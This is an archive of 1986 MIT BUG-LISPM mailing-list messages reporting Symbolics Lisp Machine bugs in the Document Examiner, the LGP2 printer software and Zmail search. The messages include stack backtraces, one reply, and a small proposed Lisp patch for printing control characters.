Received: from WITHERING.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 28680; Fri 21-Mar-86 18:04:51-EST
Date: Fri, 21 Mar 86 18:04 EST
From: Peter Szolovits <psz@MIT-MC.ARPA>
Subject: Document examiner bug
To: BUG-LISPM@MIT-ZERMATT.ARPA
cc: psz@MIT-MC.ARPA, ramesh@MIT-MC.ARPA
Message-ID: <860321180432.1.PSZ@WITHERING.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.11, MLSite 13.1,
Experimental DVI 1.1, Experimental CLISP 4.0, Experimental NIKL 32.0,
Experimental GRAPHER 16.8, LIVE-WINDOW 267.35, Experimental DTC 9.1,
microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine William Withering:

It seems that our world loads do not include some of the logical pathname definitions
needed by the document examiner.  Backtrace follows, for the strong of heart.  How should 
this be fixed?  --Pete Sz.

>>Error: The logical pathname SYS: DOC; FILE; is not defined
While in the function (:METHOD FS:LOGICAL-HOST :TRANSLATE-RAW)  (:METHOD FS:LOGICAL-PATHNAME :TRANSLATE-FROM-TO)  (:METHOD FS:LOGICAL-HOST :TRANSLATE)

(:METHOD FS:LOGICAL-HOST :TRANSLATE-RAW):  (P.C. = 36)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<LOGICAL-HOST SYS>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor FS:LOGICAL-HOST -- 9. IV's, 2. FL's 120206574>
   Arg 2 (SI:OPERATION): :TRANSLATE-RAW
   Arg 3 (FS:PATHNAME): #<LOGICAL-PATHNAME "SYS: DOC; FILE; FILE1.SAB.7">

(:METHOD FS:LOGICAL-PATHNAME :TRANSLATE-FROM-TO):  (P.C. = 5)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<LOGICAL-PATHNAME "SYS: DOC; FILE; FILE1.SAB.7">
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor FS:LOGICAL-PATHNAME -- 8. IV's, 3. FL's 120045753>
   Arg 2 (SI:OPERATION): :TRANSLATE-FROM-TO

(:METHOD FS:LOGICAL-HOST :TRANSLATE):  (P.C. = 4)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<LOGICAL-HOST SYS>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor FS:LOGICAL-HOST -- 9. IV's, 2. FL's 120206574>
   Arg 2 (SI:OPERATION): :TRANSLATE
   Arg 3 (FS:PATHNAME): #<LOGICAL-PATHNAME "SYS: DOC; FILE; FILE1.SAB.7">

(:METHOD FS:LOGICAL-PATHNAME :TRANSLATED-PATHNAME):  (P.C. = 67)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<LOGICAL-PATHNAME "SYS: DOC; FILE; FILE1.SAB.7">
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor FS:LOGICAL-PATHNAME -- 8. IV's, 3. FL's 120045753>
   Arg 2 (SI:OPERATION): :TRANSLATED-PATHNAME

SAGE:OPEN-SAGE-FILE:  (P.C. = 153)<<Error printing function name>>
   Arg 0 (SAGE:PATHNAME): #<LOGICAL-PATHNAME "SYS: DOC; FILE; FILE1.SAB.7">

(:METHOD SAGE:BASIC-DOC-RECORD :INIT):  (P.C. = 51)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<CONCEPT-DOC-RECORD 41620162>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:BASIC-DOC-RECORD -- 9. IV's, 0. FL's 120616772>
   Arg 2 (SI:OPERATION): :INIT
   Arg 3 (SAGE:INIT-PLIST): #<DTP-LOCATIVE 73700531>

ZETALISP:INSTANTIATE-FLAVOR:  (P.C. = 445)<<Error printing function name>>
   Arg 0 (SI:FLAVOR-NAME): SAGE:CONCEPT-DOC-RECORD
   Arg 1 (SI:INIT-PLIST): #<DTP-LOCATIVE 73700531>
   Arg 2 (SI:SEND-INIT-MESSAGE-P): :MAYBE
   --Defaulted args:--
   Arg 3 (SI:RETURN-UNHANDLED-KEYWORDS-P): NIL
   Arg 4 (SI:AREA-TO-CONS-INSTANCE-IN): NIL

ZETALISP:MAKE-INSTANCE:  (P.C. = 6)<<Error printing function name>>
   Arg 0 (SI:FLAVOR-NAME): SAGE:CONCEPT-DOC-RECORD
   Rest arg (SI:INIT-OPTIONS): (:INDEX (#<LOGICAL-PATHNAME "SYS: DOC; FILE; FILE1.SAB.7"> 431 963) :TOPIC DOC:FILES)

SAGE:INSTALL-RECORD:  (P.C. = 51)<<Error printing function name>>
   Arg 0 (SAGE:INDEX): (#<LOGICAL-PATHNAME "SYS: DOC; FILE; FILE1.SAB.7"> 431 963)
   Arg 1 (SAGE:TOPIC): DOC:FILES
   Arg 2 (SAGE:PROPERTY): :SAGE-SECTION-RECORD

SAGE:RECORD-FOR-TOPIC&TYPE:  (P.C. = 243)<<Error printing function name>>
   Arg 0 (SAGE:TOPIC): DOC:FILES
   Arg 1 (SAGE:TYPE): SAGE:SCRIPT
   --Defaulted args:--
   Arg 2 (SAGE:MONITOR): T

(:METHOD SAGE:SOURCE-OF-FORMATTED-SAGE-RECORD-LINES :INIT):  (P.C. = 36)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<SOURCE-OF-FORMATTED-SAGE-RECORD-LINES 41620153>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:SOURCE-OF-FORMATTED-SAGE-RECORD-LINES -- 3. IV's, 1. FL's 171127413>
   Arg 2 (SI:OPERATION): :INIT
   Arg 3 (ZETALISP:IGNORE): #<DTP-LOCATIVE 73700370>

ZETALISP:INSTANTIATE-FLAVOR:  (P.C. = 445)<<Error printing function name>>
   Arg 0 (SI:FLAVOR-NAME): SAGE:SOURCE-OF-FORMATTED-SAGE-RECORD-LINES
   Arg 1 (SI:INIT-PLIST): #<DTP-LOCATIVE 73700370>
   Arg 2 (SI:SEND-INIT-MESSAGE-P): :MAYBE
   --Defaulted args:--
   Arg 3 (SI:RETURN-UNHANDLED-KEYWORDS-P): NIL
   Arg 4 (SI:AREA-TO-CONS-INSTANCE-IN): NIL

ZETALISP:MAKE-INSTANCE:  (P.C. = 6)<<Error printing function name>>
   Arg 0 (SI:FLAVOR-NAME): SAGE:SOURCE-OF-FORMATTED-SAGE-RECORD-LINES
   Rest arg (SI:INIT-OPTIONS): (:TOPIC DOC:FILES :TYPE SAGE:SCRIPT)

SAGE:FORMATTED-SAGE-RECORD-LINE-SOURCE:  (P.C. = 11)<<Error printing function name>>
   Arg 0 (SAGE:TOPIC): DOC:FILES
   Arg 1 (SAGE:TYPE): SAGE:SCRIPT

(:METHOD SAGE:DEX-ITEM :PREPARE-DOCUMENTATION):  (P.C. = 6)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<DEX-ITEM "Files" 41620137>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:DEX-ITEM -- 11. IV's, 0. FL's 171136401>
   Arg 2 (SI:OPERATION): :PREPARE-DOCUMENTATION
   Arg 3 (SAGE:VIEWER-PANE): #<DEX-VIEWER-PANE Dex Viewer Pane 2 43203106 exposed>

(:METHOD SAGE:DEX-VIEWING-CONTEXT :DISPLAY-DEX-ITEM):  (P.C. = 15)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<DEX-VIEWING-CONTEXT "Default Viewer" 144610723>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:DEX-VIEWING-CONTEXT -- 7. IV's, 0. FL's 120302527>
   Arg 2 (SI:OPERATION): :DISPLAY-DEX-ITEM
   Arg 3 (SAGE:FRAME): #<DEX-FRAME Dex Frame 2 43200173 exposed>
   Arg 4 (SAGE:ITEM): #<DEX-ITEM "Files" 41620137>
   --Defaulted args:--
   Arg 5 (SAGE:HBOX): NIL

(:METHOD SAGE:DEX-VIEWING-CONTEXT :ADD-ITEM-TO-CONTEXT):  (P.C. = 20)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<DEX-VIEWING-CONTEXT "Default Viewer" 144610723>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:DEX-VIEWING-CONTEXT -- 7. IV's, 0. FL's 120302527>
   Arg 2 (SI:OPERATION): :ADD-ITEM-TO-CONTEXT
   Arg 3 (SAGE:FRAME): #<DEX-FRAME Dex Frame 2 43200173 exposed>
   Arg 4 (SAGE:ITEM): #<DEX-ITEM "Files" 41620137>

(:METHOD SAGE:DEX :GRAPHER-ADD-ITEM-TO-CONTEXT):  (P.C. = 10)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<DEX-FRAME Dex Frame 2 43200173 exposed>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:DEX -- 7. IV's, 3. FL's 120302067>
   Arg 2 (SI:OPERATION): :GRAPHER-ADD-ITEM-TO-CONTEXT
   Arg 3 (SAGE:ITEM): (DOC:FILES SAGE:SCRIPT "Files")

(:METHOD SAGE:DEX :COMMAND-BLIP):  (P.C. = 23)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<DEX-FRAME Dex Frame 2 43200173 exposed>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:DEX -- 7. IV's, 3. FL's 120302067>
   Arg 2 (SI:OPERATION): :COMMAND-BLIP
   Arg 3 (SAGE:BLIP-TYPE): :TYPEOUT-EXECUTE
   Arg 4 (SAGE:BLIP-ARGS): (:GRAPHER-ADD-ITEM-TO-CONTEXT (DOC:FILES SAGE:SCRIPT "Files"))

(:INTERNAL (:METHOD SAGE:DEX :COMMAND-LOOP) 0 SAGE:DOIT):  (P.C. = 44)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 73700206>

(:METHOD SAGE:DEX :COMMAND-LOOP):  (P.C. = 55)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<DEX-FRAME Dex Frame 2 43200173 exposed>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:DEX -- 7. IV's, 3. FL's 120302067>
   Arg 2 (SI:OPERATION): :COMMAND-LOOP

(:INTERNAL (:METHOD SAGE:DEX :TOPLEVEL) 1):  (P.C. = 175)
   Arg 0: #<DEX-FRAME Dex Frame 2 43200173 exposed>

(:METHOD SAGE:DEX-OUTPUT-DEVICE :WITH-DEVICE-PREPARED):  (P.C. = 21)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<DEX-OUTPUT-DEVICE 41536774>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:DEX-OUTPUT-DEVICE -- 3. IV's, 0. FL's 171141157>
   Arg 2 (SI:OPERATION): :WITH-DEVICE-PREPARED
   Arg 3 (FUNCTION): #<LEXICAL-CLOSURE (:INTERNAL ** 1) 73700055>
   Rest arg (ZETALISP:ARGS): NIL

(:INTERNAL SAGE:WITH-SAGE-DEVICE-INTERNAL 0 SAGE:DOIT):  (P.C. = 27)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 73700072>
   Arg 1 (SAGE:DEV): #<DEX-OUTPUT-DEVICE 41536774>

SAGE:WITH-SAGE-DEVICE-INTERNAL:  (P.C. = 77)<<Error printing function name>>
   Arg 0 (SAGE:DEVICE): #<DEX-VIEWER-PANE Dex Viewer Pane 2 43203106 exposed>
   Arg 1 (SAGE:TYPE): :DEX
   Arg 2 (SAGE:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL ** 1) 73700055>

(:METHOD SAGE:DEX :TOPLEVEL):  (P.C. = 73)<<Error printing function name>>
   Arg 0 (ZETALISP:SELF): #<DEX-FRAME Dex Frame 2 43200173 exposed>
   Arg 1 (ZETALISP-SYSTEM:SELF-MAPPING-TABLE): #<Map to flavor SAGE:DEX -- 7. IV's, 3. FL's 120302067>
   Arg 2 (SI:OPERATION): :TOPLEVEL

SAGE:DEX-TOPLEVEL:  (P.C. = 4)<<Error printing function name>>
   Arg 0 (SAGE:FRAME): #<DEX-FRAME Dex Frame 2 43200173 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)<<Error printing function name>>
   --Defaulted args:--
   Arg 0 (ZETALISP:IGNORE): NIL
22-Mar-86 03:24:47-EST,1885;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 22 Mar 86 02:45-EST
Received: from VIOLIN.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 28705; Sat 22-Mar-86 02:45:58-EST
Date: Sat, 22 Mar 86 02:46 EST
From: Richard E. Zippel <RZ@MIT-ZERMATT.ARPA>
Subject: Document examiner bug
To: psz@MIT-MC.ARPA, BUG-LISPM@MIT-ZERMATT.ARPA
cc: ramesh@MIT-MC.ARPA
In-Reply-To: <860321180432.1.PSZ@WITHERING.LCS.MIT.EDU>
Message-ID: <860322024643.6.RZ@VIOLIN.LCS.MIT.EDU>

    Date: Fri, 21 Mar 86 18:04 EST
    From: Peter Szolovits <psz@MIT-MC.ARPA>

    In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
    FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.11, MLSite 13.1,
    Experimental DVI 1.1, Experimental CLISP 4.0, Experimental NIKL 32.0,
    Experimental GRAPHER 16.8, LIVE-WINDOW 267.35, Experimental DTC 9.1,
    microcode TMC5-IO4-ST506-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Lisp Machine William Withering:

    It seems that our world loads do not include some of the logical pathname definitions
    needed by the document examiner.  Backtrace follows, for the strong of heart.  How should 
    this be fixed?  --Pete Sz.

    >>Error: The logical pathname SYS: DOC; FILE; is not defined
    While in the function (:METHOD FS:LOGICAL-HOST :TRANSLATE-RAW)  (:METHOD FS:LOGICAL-PATHNAME :TRANSLATE-FROM-TO)  (:METHOD FS:LOGICAL-HOST :TRANSLATE)

Looks to me like either you had some problem related to a namespace
problem we were having on Zermatt (unlikely) or you did something wrong
when building your world (more likely).  The world your incremental band
is based on does have all the proper logical translations.  The
namespace problem has been fixed, so if your still having problems let
me know.
22-Mar-86 22:41:33-EST,4059;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 22 Mar 86 22:41-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 26498; Sat 22-Mar-86 22:44:17-EST
Date: Sat, 22 Mar 86 22:41 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: LGP2 printer bug
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860322224135.1.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

Apparently one cannot send a lgp2-printer the :convert-from-device-units
message, with :pixel as an argument. Release 6.1 patch notes, page 143,
says one can.

>>Error: The object #<LGP2-PAGE-BUFFERING-STREAM 17272272> received a :DEVICE-UNITS-TO-PIXELS message, which went unclaimed.
         The rest of the message was (72.0 :HORIZONTAL)
While in the function (:METHOD SI:BASIC-HARDCOPY-STREAM :CONVERT-FROM-DEVICE-UNITS)  (:DEFUN-METHOD DVI:DEVICE-DPI)  (:DEFUN-METHOD DVI:COMPUTE-SCALE)

SI:INSTANCE-HASH-UNCLAIMED-MESSAGE:  (P.C. = 35)
   Arg 0 (SELF): #<LGP2-PAGE-BUFFERING-STREAM 17272272>
   Arg 1 (SYS:SELF-MAPPING-TABLE): NIL
   Rest arg (SI:MESSAGE): (:DEVICE-UNITS-TO-PIXELS 72.0 :HORIZONTAL)
   Local 3 (SI:FL): #<FLAVOR LGP:LGP2-PAGE-BUFFERING-STREAM 123366702>

(:METHOD SI:BASIC-HARDCOPY-STREAM :CONVERT-FROM-DEVICE-UNITS):  (P.C. = 63)
   Arg 0 (SELF): #<LGP2-PAGE-BUFFERING-STREAM 17272272>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor SI:BASIC-HARDCOPY-STREAM -- 27. IV's, 0. FL's 26704506>
   Arg 2 (SI:OPERATION): :CONVERT-FROM-DEVICE-UNITS
   Arg 3 (SI:QUAN): 72.0
   Arg 4 (SI:UNITS): :PIXEL
   Arg 5 (SI:DIRECTION): :HORIZONTAL

(:DEFUN-METHOD DVI:DEVICE-DPI):  (P.C. = 14)  (from B:>aisite>dvi-stream)
   Arg 0 (SELF): #<DVI-HARDCOPY-INPUT-FILTER 17272133>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor DVI:DVI-HARDCOPY-INPUT-FILTER -- 32. IV's, 0. FL's 26704453>

(:DEFUN-METHOD DVI:COMPUTE-SCALE):  (P.C. = 37)  (from B:>aisite>dvi-stream)
   Arg 0 (SELF): #<DVI-HARDCOPY-INPUT-FILTER 17272133>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor DVI:DVI-HARDCOPY-INPUT-FILTER -- 32. IV's, 0. FL's 26704453>

(:METHOD DVI:DVI-HARDCOPY-INPUT-FILTER :PROCESS-INPUT-FILE):  (P.C. = 26)  (from B:>aisite>dvi-stream)
   Arg 0 (SELF): #<DVI-HARDCOPY-INPUT-FILTER 17272133>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor DVI:DVI-HARDCOPY-INPUT-FILTER -- 32. IV's, 0. FL's 26704453>
   Arg 2 (SI:OPERATION): :PROCESS-INPUT-FILE

DVI:HARDCOPY-DVI-STREAM:  (P.C. = 16)  (from B:>aisite>dvi-stream)
   Arg 0 (DVI:STREAM): #<FILE-INPUT-BINARY-STREAM "PREP: //u//cjl//two.dvi" 17272113>
   Arg 1 (DVI:DEVICE): #<LGP2-PRINTER LE-MONDE 43302510>
   Rest arg (DVI:OPTIONS): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (DVI:HARDCOPY-DVI-STREAM STREAM SI:*DEFAULT-HARDCOPY-DEVICE*)
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): (((STREAM #<FILE-INPUT-BINARY-STREAM "PREP: //u//cjl//two.dvi" 17272113>) (SI:.STREAM-ABORT-FLAG. :ABORT)) NIL NIL NIL NIL NIL NIL)
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL

PROGN:  (P.C. = 20)
   Arg 0 (SI:.FORM.): (PROGN (DVI:HARDCOPY-DVI-STREAM STREAM SI:*DEFAULT-HARDCOPY-DEVICE*))
   Arg 1 (SI:ENV): (((STREAM #<FILE-INPUT-BINARY-STREAM "PREP: //u//cjl//two.dvi" 17272113>) (SI:.STREAM-ABORT-FLAG. :ABORT)) NIL NIL NIL NIL NIL NIL)

Rest of stack:
SI:*EVAL:  (P.C. = 163)
MULTIPLE-VALUE-PROG1:  (P.C. = 26)
SI:*EVAL:  (P.C. = 163)
UNWIND-PROTECT:  (P.C. = 22)
SI:*EVAL:  (P.C. = 163)
SI:DIGESTED-LET:  (P.C. = 236)
SI:DIGEST-INTERNAL:  (P.C. = 30)
LET:  (P.C. = 37)
SI:*EVAL:  (P.C. = 163)
(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0.):  (P.C. = 152)
TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
SI:LISP-COMMAND-LOOP:  (P.C. = 67)
SI:LISP-TOP-LEVEL1:  (P.C. = 5)
SI:LISP-TOP-LEVEL:  (P.C. = 7)
23-Mar-86 12:58:41-EST,986;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Mar 86 12:58-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 26568; Sun 23-Mar-86 13:01:35-EST
Date: Sun, 23 Mar 86 12:58 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: lgp:canonicalize-lgp2-font is too smart for it own good
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860323125851.2.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

lgp:canonicalize-lgp2-font should accept a symbol in the fonts package,
that has a fed:bfont-descriptor property of a bfd, or at least a bfd
itself, and to use that bfd as the downloadable font.

I want to be able to say "Use this bfd, don't try to be smart".
23-Mar-86 16:42:24-EST,2030;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Mar 86 16:42-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 26572; Sun 23-Mar-86 16:45:28-EST
Date: Sun, 23 Mar 86 16:42 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: lgp2 :show-char should show characters with codes < 40 octal
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860323164244.3.CJL@OTIS.AI.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-IO4-COL-MIC 353, FEP 127, FEP0:>V127-LISP.FLOD(2),
FEP0:>V127-LOADERS.FLOD(3), FEP0:>V127-INFO.FLOD(2),
FEP0:>V127-DEBUG.FLOD(1), on Lisp Machine Otis Redding:

Currently, the lgp2 printer software doesn't show characters that have
char-codes less than 40 octal. Why not? I think it should.

Here's what the code is now.

(defmethod (postscript-output-stream :show-char) (char)
  (cond (( (char-code char) #o200)
	 (send self :force-string)
	 (format si:output-stream " ~d ns~%" (char-code char))
	 (incf si:device-cursor-x (send self ':character-width char)))
	((< (char-code char) #o40)
	 ;;Ignore
	 )					
	(T (when (and *force-string-uses-show* (string-search-char char "\()"))
	     (array-push-extend char-string #/\))
	   (array-push-extend char-string char)
	   (incf si:device-cursor-x (send self ':character-width char))
	   (setq char-string-in-use T))))

Why not make it something like this?

(defmethod (postscript-output-stream :show-char) (char)
  (cond ((or ( (char-code char) #o200) (< (char-code char) #o40))
	 (send self :force-string)
	 (format si:output-stream " ~d ns~%" (char-code char))
	 (incf si:device-cursor-x (send self ':character-width char)))
	(T (when (and *force-string-uses-show* (string-search-char char "\()"))
	     (array-push-extend char-string #/\))
	   (array-push-extend char-string char)
	   (incf si:device-cursor-x (send self ':character-width char))
	   (setq char-string-in-use T))))
23-Mar-86 19:08:53-EST,4107;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Mar 86 19:08-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 23 MAR 86  19:07:50 EST
Received: from OZ.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 26581; Sun 23-Mar-86 19:10:56-EST
Received: from MORRISON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 23 Mar 86 19:04-EST
Date: Sun, 23 Mar 86 19:05 EST
From: JCMA@MIT-AI.ARPA
Subject: Blowout searching for extended search string in zmail using a universe
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860323190517.7.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Experimental RELATUS 147.49, microcode TMC5-MIC 336,
FEP 127, FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jim Morrison:



>>Trap: The second argument given to the \ instruction, :STRING-FOR-TEMPORARY, was not a single-precision floating-point number, a fixnum, or an extended number.
While in the function RANDOM  ZWEI:GENERATE-COLLECTION-NAME  ZWEI:MAKE-COLLECTION-FROM-FILTER

RANDOM:  (P.C. = 75)
   Arg 0 (ARG): :STRING-FOR-TEMPORARY
   --Defaulted args:--
   Arg 1 (ARRAY): #<ART-Q-LIST-71 144245311>
   Local 2 (SI:PTR1): 12
   Local 3 (SI:PTR2): 47
   Local 4 (SYS:SIZE): 71
   Local 5 (SI:ANS): -964676134

ZWEI:GENERATE-COLLECTION-NAME:  (P.C. = 5)
   Arg 0 (ZWEI:UNIVERSE): RANDOM
   Arg 1 (ZWEI:FILTER-FUNCTION): ZWEI:MSG-HAS-FSM-EXPR-SEARCH-STRING
   Arg 2 (ZWEI:FILTER-ARG): (("charles" "benjamin") #:|-1028|)

ZWEI:MAKE-COLLECTION-FROM-FILTER:  (P.C. = 10)
   Arg 0 (ZWEI:UNIVERSE): RANDOM
   Arg 1 (ZWEI:FILTER-FUNCTION): ZWEI:MSG-HAS-FSM-EXPR-SEARCH-STRING
   Arg 2 (ZWEI:FILTER-ARG): (("charles" "benjamin") #:|-1028|)
   --Defaulted args:--
   Arg 3 (ZWEI:COLLECTION): NIL

ZWEI:GET-FILTER-COLLECTION:  (P.C. = 7)

ZWEI:COM-ZMAIL-SELECT:  (P.C. = 15)

ZWEI:COMMAND-EXECUTE:  (P.C. = 57)
   Arg 0 (ZWEI:COMMAND): ZWEI:COM-ZMAIL-SELECT
   Arg 1 (ZWEI:CHAR): (:MENU ("Select" . ZWEI:COM-ZMAIL-SELECT) 2 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 8 43224160 exposed>)
   --Defaulted args:--
   Arg 2 (ZWEI:PREFIX-CHAR): NIL
   Arg 3 (ZWEI:HOOK-LIST): NIL

ZWEI:ZMAIL-COMMAND-EXECUTE:  (P.C. = 6)
   Arg 0: ZWEI:COM-ZMAIL-SELECT

(:INTERNAL ZWEI:ZMAIL-COMMAND-LIST 0 (:MENU)):  (P.C. = 10)
   Arg 0 (SI:**DEFSELECT-OP**): :MENU
   Arg 1 (ZWEI:ITEM): ("Select" . ZWEI:COM-ZMAIL-SELECT)
   Arg 2 (ZWEI:CH): 2
   Arg 3 (ZWEI:WINDOW): #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 8 43224160 exposed>

ZWEI:ZMAIL-COMMAND-LIST:  (P.C. = 12)
   Arg 0 (SI:OPERATION): :MENU
   Rest arg (SI:SELECT-METHOD-ARGS): (("Select" . ZWEI:COM-ZMAIL-SELECT) 2 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 8 43224160 exposed>)

(:METHOD ZWEI:ZMAIL-FRAME :PROCESS-SPECIAL-COMMAND):  (P.C. = 16)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :PROCESS-SPECIAL-COMMAND
   Rest arg (ARGS): (:MENU ("Select" . ZWEI:COM-ZMAIL-SELECT) 2 #<ZMAIL-MAIN-COMMAND-MENU-PANE Zmail Main Command Menu Pane 8 43224160 exposed>)

(:METHOD ZWEI:ZMAIL-FRAME :COMMAND-LOOP):  (P.C. = 136)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:OPERATION): :COMMAND-LOOP

(:METHOD ZWEI:ZMAIL-FRAME :COMBINED :COMMAND-LOOP):  (P.C. = 70)
   Arg 0 (SELF): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor ZWEI:ZMAIL-FRAME -- 66. IV's, 20. FL's 146565661>
   Arg 2 (SI:.OPERATION.): :COMMAND-LOOP
   Rest arg (SI:.DAEMON-CALLER-ARGS.): NIL

ZWEI:ZMAIL-PROCESS-TOP-LEVEL:  (P.C. = 105)
   Arg 0 (ZWEI:WINDOW): #<ZMAIL-FRAME Main Zmail Window 43200325 exposed>

SI:PROCESS-TOP-LEVEL:  (P.C. = 54)
   --Defaulted args:--
   Arg 0 (IGNORE): NIL
23-Mar-86 21:54:07-EST,1210;000000000000
